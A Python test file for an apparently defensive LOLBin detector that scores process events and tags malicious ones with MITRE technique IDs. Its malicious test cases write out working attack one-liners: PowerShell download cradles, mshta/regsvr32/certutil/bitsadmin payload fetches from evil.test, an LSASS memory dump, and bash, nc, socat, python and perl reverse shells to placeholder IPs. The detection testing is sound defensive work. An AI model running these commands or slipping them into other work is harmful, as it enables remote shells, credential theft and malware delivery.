from __future__ import annotations

import pytest

from centralium.agent.lolbins import LOLBINS, LolbinContext, LolbinDetector, canonical_lolbin
from centralium.agent.models import EventType, FindingSource, NormalizedEvent

D = LolbinDetector()
LONG_B64 = "A" * 40


def proc(
    name: str, cmd: str, parent: str | None = None, user: str = "alice", exe: str | None = None, **kw
) -> NormalizedEvent:
    return NormalizedEvent(
        event_type=EventType.PROCESS_START,
        process_name=name,
        command_line=cmd,
        parent_process=parent,
        user=user,
        executable_path=exe,
        pid=100,
        ppid=50,
        source="test",
        **kw,
    )


def test_spec_lists_present():
    for n in (
        "powershell",
        "cmd",
        "wscript",
        "cscript",
        "mshta",
        "rundll32",
        "regsvr32",
        "certutil",
        "bitsadmin",
        "wmic",
        "bash",
        "sh",
        "curl",
        "wget",
        "python",
        "perl",
        "nc",
        "socat",
    ):
        assert n in LOLBINS
    assert canonical_lolbin("python3.12") == "python" and canonical_lolbin("pwsh") == "powershell"
    assert canonical_lolbin("notepad") is None


@pytest.mark.parametrize(
    ("name", "cmd", "parent"),
    [
        ("powershell.exe", "powershell Get-Process", "explorer.exe"),
        ("cmd.exe", "cmd /c dir", "explorer.exe"),
        ("bash", "bash -c 'ls -la'", "gnome-terminal-"),
        ("curl", "curl https://example.com/api/status", "bash"),
        ("python3", "python3 manage.py runserver", "bash"),
        ("certutil.exe", "certutil -hashfile a.bin SHA256", "cmd.exe"),
        ("wmic.exe", "wmic os get caption", "cmd.exe"),
    ],
)
def test_benign_lolbin_use_is_not_a_finding(name, cmd, parent):
    a, findings = D.evaluate(proc(name, cmd, parent), LolbinContext(pair_count=3, proc_count=10))
    assert a.is_lolbin
    assert a.score < 40
    assert findings == []


@pytest.mark.parametrize(
    ("name", "cmd", "parent", "tech"),
    [
        ("powershell.exe", f"powershell -nop -w hidden -enc {LONG_B64}", "WINWORD.EXE", "T1059.001"),
        (
            "powershell.exe",
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a')",
            "EXCEL.EXE",
            "T1105",
        ),
        ("mshta.exe", "mshta http://evil.test/a.hta", "explorer.exe", "T1218.005"),
        ("regsvr32.exe", "regsvr32 /s /n /u /i:http://evil.test/x.sct scrobj.dll", "cmd.exe", "T1218.010"),
        (
            "rundll32.exe",
            "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full",
            "cmd.exe",
            "T1003.001",
        ),
        ("certutil.exe", "certutil -urlcache -split -f http://evil.test/p.exe p.exe", "cmd.exe", "T1105"),
        (
            "bitsadmin.exe",
            "bitsadmin /transfer j /download /priority high http://evil.test/p.exe C:\\p.exe",
            "cmd.exe",
            "T1197",
        ),
        ("wmic.exe", "wmic /node:10.0.0.5 process call create 'cmd /c calc'", "wmiprvse.exe", "T1047"),
        ("bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "apache2", "T1059.004"),
        ("sh", "sh -c 'curl http://203.0.113.9/x.sh | sh'", "php-fpm", "T1105"),
        ("nc", "nc -e /bin/sh 203.0.113.9 4444", "bash", "T1095"),
        ("socat", "socat TCP:203.0.113.9:4444 EXEC:/bin/sh,pty", "bash", "T1095"),
        (
            "python3",
            'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])\'',
            "bash",
            "T1059.006",
        ),
        (
            "perl",
            'perl -e \'use Socket;socket(S,PF_INET,SOCK_STREAM,6);open(STDIN,">&S");exec("/bin/sh")\'',
            "bash",
            "T1059",
        ),
        ("wget", "wget -q http://203.0.113.9/miner -O /tmp/miner", "sh", "T1105"),
    ],
)
def test_malicious_context_is_flagged_with_mitre(name, cmd, parent, tech):
    a, findings = D.evaluate(proc(name, cmd, parent), LolbinContext(pair_count=1, proc_count=1))
    assert findings, (name, a.score, a.signals)
    f = findings[0]
    assert f.source == FindingSource.LOLBIN and f.score >= 40
    assert tech in f.mitre_techniques
    assert f.details["signals"]


def test_context_changes_score_same_binary():
    cmd = "powershell -nop -ep bypass -c Get-Date"
    benign, _ = D.evaluate(
        proc("powershell.exe", cmd, "explorer.exe", "alice"), LolbinContext(pair_count=30, proc_count=100)
    )
    hostile, _ = D.evaluate(
        proc("powershell.exe", cmd, "WINWORD.EXE", "alice"), LolbinContext(pair_count=1, proc_count=1)
    )
    assert hostile.score > benign.score + 25
    assert benign.score < 40


def test_frequency_and_interactive_parent_dampen():
    cmd = "bash -c 'chmod +x /tmp/build.sh'"
    fresh, _ = D.evaluate(proc("bash", cmd, "cron"), LolbinContext(pair_count=1, proc_count=1))
    common, _ = D.evaluate(proc("bash", cmd, "make"), LolbinContext(pair_count=50, proc_count=500))
    assert common.score < fresh.score
    assert common.dampeners


def test_service_account_and_masquerade_signals():
    a, f = D.evaluate(
        proc("sh", "sh -c id", "nginx", user="www-data"), LolbinContext(pair_count=1, proc_count=1)
    )
    ids = {s[0] for s in a.signals}
    assert {"parent_service", "service_account"} <= ids and f
    a2, _ = D.evaluate(
        proc("cmd.exe", "cmd /c whoami", "explorer.exe", exe="C:\\Users\\Public\\cmd.exe"), LolbinContext()
    )
    assert "exe_in_temp" in {s[0] for s in a2.signals}


def test_network_context_for_lolbin_process():
    ev = NormalizedEvent(
        event_type=EventType.NETWORK_CONNECT,
        process_name="mshta.exe",
        destination_ip="198.51.100.77",
        destination_port=4444,
        pid=9,
        source="test",
    )
    a, f = D.evaluate(ev, LolbinContext(dest_rarity=1.0))
    assert a.score >= 40 and f
    # curl to a common destination is not suspicious
    ev2 = NormalizedEvent(
        event_type=EventType.NETWORK_CONNECT,
        process_name="curl",
        destination_ip="198.51.100.77",
        destination_port=443,
        pid=9,
        source="test",
    )
    a2, f2 = D.evaluate(ev2, LolbinContext(dest_rarity=0.01))
    assert f2 == [] and a2.score < 40


def test_non_lolbin_and_other_events_ignored():
    a, f = D.evaluate(proc("notepad.exe", "notepad a.txt"), LolbinContext())
    assert not a.is_lolbin and f == []
    ev = NormalizedEvent(event_type=EventType.PROCESS_EXIT, process_name="powershell.exe", source="test")
    assert D.evaluate(ev)[1] == []
